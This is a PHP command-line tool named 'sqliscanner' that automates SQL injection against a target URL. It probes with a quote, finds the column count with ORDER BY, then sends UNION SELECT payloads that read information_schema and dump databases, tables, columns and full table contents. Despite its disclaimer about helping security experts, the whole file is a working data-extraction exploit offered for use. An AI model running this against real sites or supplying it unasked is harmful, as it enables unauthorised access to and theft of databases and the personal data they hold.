<?php

echo "\e[1;34;40m";

echo  <<<END
     ---------------------------------------------------------- 
     =   ___  ___  _   _  ___  ___  ___  _  _  _  _  __  ___  =
     =  |_ ˙|| ° || | | ||_ ˙||  _|| _ || `| || `| || _||_°_| =                      
     =  |___||_  ||__||_||___||___||_|_||_|`_||_|`_||__||_|_| =
     =         |_|                  <amirzecdev@outlook.com>  =
     =                                                        =
     ----------------------------------------------------------
    END;

echo " \n";
print " [ sqliscanner v1.0.0 ]";
echo "\e[0m";
echo "\n";
echo " [ Intention of this tool is to help and automate process of discovering SQL vulnerability\n";
echo " and help security experts to prevent them. Users of this software are responsible\n";
echo " for consequences of usage this software in illegal purpose. ]";
echo "\n\n\n";
echo "\e[1;33;40m";
echo "\e[0m";

$longOptions = array(
    "url:",
    "database:",
    "table:",
    "help",
);

$options = getopt("u:d:t:h", $longOptions);

if (array_key_exists("help", $options) ||  array_key_exists("h", $options)) {
    echo "\e[1;33;40m";
    echo " Help manual";
    echo "\e[0m";
    echo "\n";
    echo "\n";
    echo " usage: php sqliscanner.php [ options ]";
    echo "\n";
    echo "\n";
    echo " Options:";
    echo "\n";
    echo "\e[1;33;40m";
    echo "      Short options:";
    echo "\e[0m";
    echo "\n\n";
    echo "      -u           :";
    echo " target url";
    echo "                     <required>";
    echo "\n";
    echo "      -d           :";
    echo " target database";
    echo "                <required>";
    echo "\n";
    echo "      -t           :";
    echo " table from database";
    echo "            <required>";
    echo "\n";
    echo "      -h           :";
    echo " list all commands ";
    echo "\n\n";
    echo "\e[1;33;40m";
    echo "      Long options:";
    echo "\e[0m";
    echo "\n\n";
    echo "      --url        :";
    echo " target url ";
    echo "                    <required>";
    echo "\n";
    echo "      --database   :";
    echo " target database";
    echo "                <required>";
    echo "\n";
    echo "      --table      :";
    echo " table from database";
    echo "            <required>";
    echo "\n";
    echo "      --help       :";
    echo " list all commands";
    echo "\n\n";
    echo " Examples:";
    echo "\n\n";
    echo "\e[1;33;40m";
    echo "      Testing is URL vulnerable";
    echo "\e[0m";
    echo "\n";
    echo "                   php sqliscanner.php --url http://targetlink/vulnerablePage.php?id=1";
    echo "\n";
    echo "\e[1;33;40m";
    echo "\n";
    echo "      Return tables from specific database";
    echo "\e[0m";
    echo "\n";
    echo "                    php sqliscanner.php --url http://targetlink/vulnerablePage.php?id=1 --database users";
    echo "\n";
    echo "\e[1;33;40m";
    echo "\n";
    echo "      Display data from specific table and database";
    echo "\e[0m";
    echo "\n";
    echo "                    php sqliscanner.php -url https://targetlink/vulnerablePage.php?id=1 --database db --table users";
    echo "\n\n";
    echo "       <You are free to use short options. I used here long variant, because it is more clear.> ";
}

if (count($options) == 0) {
    echo "\e[1;31;40m";
    echo " Invald option. If you are not sure how to use this tool, type --help or -h option as option argument";
    echo "\e[0m";
    echo "\n\n";
}

$cURLConnection = curl_init();
curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);


if (count($options) === 1) {

    if (array_key_exists("u", $options) || array_key_exists("url", $options)) {


        if (isset($options['u'])) {
            $url = $options['u'];
        } else {
            $url = $options['url'];
        }


        curl_setopt($cURLConnection, CURLOPT_URL, "$url");
        curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);
        $normalContent = curl_exec($cURLConnection);

        curl_setopt($cURLConnection, CURLOPT_URL, "$url'");
        curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($cURLConnection);
        echo "\n";
        echo "\e[1;33;40m";
        echo " [ " . date("h:i:s") . " ]";
        echo "\e[0m";
        echo " Injecting payload to check is URL vulnerable";
        echo "\n";


        if (strpos($response, 'error')) {
            echo "\e[1;33;40m";
            echo " [ " . date("h:i:s") . " ]";
            echo "\e[0m";
            echo "\e[0;32;40m";
            echo ' Target url is vulnerable';
            echo "\e[0m";
            echo "\n";
            for ($i = 1; $i < 15; $i++) {
                curl_setopt($cURLConnection, CURLOPT_URL, "$url+ORDER+BY+$i");
                $response = curl_exec($cURLConnection);
                if (strpos($response, 'error')) {
                    echo "\e[1;33;40m";
                    echo " [ " . date("h:i:s") . " ]";
                    echo "\e[0m";
                    echo " Finding vulnerable column";
                    echo "\e[0m";
                    echo "\n";
                    echo "\e[1;33;40m";
                    echo " [ " . date("h:i:s") . " ]";
                    echo "\e[0m";
                    echo " Displaying data";
                    echo "\n\n";
                    $findNumberOfColumns = $i - 1;
                    break;
                }
            }
            $rangeOfNumbers = range(1, $findNumberOfColumns);
            $listOfNumbers = implode(',', $rangeOfNumbers);

            curl_setopt($cURLConnection, CURLOPT_URL, "$url+union+select+$listOfNumbers");

            $response = curl_exec($cURLConnection);
            $vulColumn = preg_replace('/[^0-9]/', '', $response);
            $payload = "(SELECT%20CAST(GROUP_CONCAT(schema_name,0x0a)%20as%20CHAR(8192))%20FROM%20(SELECT%20*%20FROM%20information_schema.schemata)a)";
            $union = "+UNION+ALL+SELECT+";
            $urlUnionListOfNumbers = "$url$union$listOfNumbers";

            $injectPayload = str_replace($vulColumn, $payload, $urlUnionListOfNumbers);
            $fullQueryWithEnd = $injectPayload . '--%20-';
            echo "\n\n";
            echo " -------------------------------\n";
            echo " = \e[1;33;40m DATABASE LIST \e[0m             =\n";
            echo " -------------------------------\n";
            echo "\n";

            curl_setopt($cURLConnection, CURLOPT_URL, $fullQueryWithEnd);
            $responseData = curl_exec($cURLConnection);
            $excludeContent = strpos($responseData, ",");
            $formattedData = substr($responseData, $excludeContent);
            echo str_replace(",", "  ", $formattedData);
            echo "\n";
        }
    }
}


if (count($options) === 2) {
    if ((array_key_exists("u", $options) || array_key_exists("url", $options)) && (array_key_exists("d", $options) || array_key_exists("database", $options))) {

        if (isset($options['u'])) {
            $url = $options['u'];
        } else {
            $url = $options['url'];
        }

        if (isset($options['d'])) {
            $database = $options['d'];
        } else {
            $database = $options['database'];
        }

        curl_setopt($cURLConnection, CURLOPT_URL, "$url");
        curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);
        $normalContent = curl_exec($cURLConnection);
        $countOfChars = strlen($normalContent);


        curl_setopt($cURLConnection, CURLOPT_URL, "$url'");
        curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($cURLConnection);
        echo "\n";
        echo "\e[1;33;40m";
        echo " [ " . date("h:i:s") . " ]";
        echo "\e[0m";
        echo " Injecting payload to check is URL vulnerable";
        echo "\n";


        if (strpos($response, 'error')) {
            echo "\e[1;33;40m";
            echo " [ " . date("h:i:s") . " ]";
            echo "\e[0m";
            echo "\e[0;32;40m";
            echo ' Target url is vulnerable';
            echo "\e[0m";
            echo "\n";
            for ($i = 1; $i < 15; $i++) {
                curl_setopt($cURLConnection, CURLOPT_URL, "$url+ORDER+BY+$i");
                curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);

                $response = curl_exec($cURLConnection);

                if (strpos($response, 'error')) {
                    echo "\e[1;33;40m";
                    echo " [ " . date("h:i:s") . " ]";
                    echo "\e[0m";
                    echo " Finding vulnerable column";
                    echo "\n";
                    echo "\e[0m";
                    echo "\e[1;33;40m";
                    echo " [ " . date("h:i:s") . " ]";
                    echo "\e[0m";
                    echo " Displaying data";
                    echo "\n\n";
                    $findNumberOfColumns = $i - 1;
                    break;
                }
            }

            $number = range(1, $findNumberOfColumns);
            $List = implode(',', $number);

            curl_setopt($cURLConnection, CURLOPT_URL, "$url+union+select+$List");
            curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($cURLConnection);

            $vulColumn = preg_replace('/[^0-9]/', '', $response);
            $payload = "(SELECT%20CAST(GROUP_CONCAT(table_name,0x0a)%20as%20CHAR(4096))%20FROM%20(SELECT%20*%20FROM%20information_schema.tables%20WHERE%20table_schema=%27$database%27)a)";
            $union = "+UNION+ALL+SELECT+";

            $unionAndList = "$union$List";
            $end = "--%20-";
            $injectPayload = str_replace($vulColumn, $payload, $unionAndList);
            $fullQueryWithEnd = "$url$injectPayload$end";

            echo " -------------------------------\n";
            echo " = \e[1;33;40m TABLE LIST \e[0m                =\n";
            echo " -------------------------------\n";

            curl_setopt($cURLConnection, CURLOPT_URL, $fullQueryWithEnd);
            curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);
            $responseData = curl_exec($cURLConnection);

            $excludeContent = substr($responseData, $countOfChars);

            $formattedData = preg_replace("/,/", " ", $excludeContent);
            echo " ";
            echo $formattedData;
            echo "\n\n";
        }
    }
}


if (count($options) === 3) {
    if ((array_key_exists("u", $options) || array_key_exists("url", $options)) && (array_key_exists("d", $options) || array_key_exists("database", $options))  &&  (array_key_exists("t", $options) || array_key_exists("table", $options))) {

        if (isset($options['u'])) {
            $url = $options['u'];
        } else {
            $url = $options['url'];
        }

        if (isset($options['d'])) {
            $database = $options['d'];
        } else {
            $database = $options['database'];
        }

        if (isset($options['t'])) {
            $table = $options['t'];
        } else {
            $table = $options['table'];
        }

        curl_setopt($cURLConnection, CURLOPT_URL, "$url");
        curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);
        $normalContent = curl_exec($cURLConnection);
        $countOfChars = strlen($normalContent);

        echo "\n";
        echo "\e[1;33;40m";
        echo " [ " . date("h:i:s") . " ]";
        echo "\e[0m";
        echo " Injecting payload to check is URL vulnerable";
        echo "\n";


        for ($i = 1; $i < 15; $i++) {
            curl_setopt($cURLConnection, CURLOPT_URL, "$url+ORDER+BY+$i");
            $response = curl_exec($cURLConnection);

            if (strpos($response, 'error')) {
                echo "\e[1;33;40m";
                echo " [ " . date("h:i:s") . " ]";
                echo "\e[0m";
                echo "\e[0;32;40m";
                echo ' Target url is vulnerable';
                echo "\e[0m";
                echo "\n";
                echo "\e[1;33;40m";
                echo " [ " . date("h:i:s") . " ]";
                echo "\e[0m";
                echo " Finding vulnurable column";
                echo "\e[0m";
                echo "\n";
                echo "\e[1;33;40m";
                echo " [ " . date("h:i:s") . " ]";
                echo "\e[0m";
                echo " Displaying data";
                echo "\n\n";
                $findNumberOfColumns = $i - 1;
                break;
            }
        }

        $number = range(1, $findNumberOfColumns);
        $list = implode(',', $number);

        curl_setopt($cURLConnection, CURLOPT_URL, "$url+union+select+$list");
        $response = curl_exec($cURLConnection);

        $vulColumn = preg_replace('/[^0-9]/', '', $response);
        $payload = "(SELECT%20CAST(GROUP_CONCAT(column_name,0x0a)%20as%20CHAR(4096))%20FROM%20(SELECT%20*%20FROM%20information_schema.columns%20WHERE%20table_schema='$database'%20AND%20table_name='$table')a)";
        $union = "+UNION+ALL+SELECT+";
        $end = '--%20-';
        $unionAndList = "$union$list";
        $injectPayload = str_replace($vulColumn, $payload, $unionAndList);
        $fullQueryWithEnd = "$url$injectPayload$end";

        curl_setopt($cURLConnection, CURLOPT_URL, $fullQueryWithEnd);
        curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);

        $respo = curl_exec($cURLConnection);
        $columns = substr($respo, $countOfChars);
        $removeNewLine = preg_replace("/[\r\n]*/", "", $columns);


        $splitString = explode(",", $removeNewLine);
        $countParts = count($splitString);

        $output = '';
        foreach ($splitString as $key => $element) {
            if ($key == $countParts - 1) {
                $output .= "'%20" . $element . "%20',$element";
                break;
            }
            $output .= "'%20" . $element . "%20',$element," . "%20";
        }

        echo "\n";

        $str = preg_replace("/[\r\n]*/", "", $columns);
        $payload = "(SELECT%20CAST(GROUP_CONCAT($output)%20as%20CHAR(4096))%20FROM%20(SELECT%20*%20FROM%20$database.$table)a)";
        $unionAndList = "$union$list";
        $injectPayload = str_replace($vulColumn, $payload, $unionAndList);
        $fullQueryWithEnd = "$url$injectPayload$end";
        curl_setopt($cURLConnection, CURLOPT_URL, $fullQueryWithEnd);
        curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);
        $responseData = curl_exec($cURLConnection);

        echo "\n";
        echo " -----------------------------------\n";
        echo " = \e[1;33;40m TABLE DATA \e[0m                    =\n";
        echo " -----------------------------------\n";
        echo "\n";

        $excludeCommas = str_replace(", id", " id", $responseData);
        $excludeContent = str_replace(" id", "\n id", $excludeCommas);
        $position = strpos($excludeContent, "id");
        echo " ";
        echo substr($excludeContent, $position);
        echo "\n\n";

    }
}
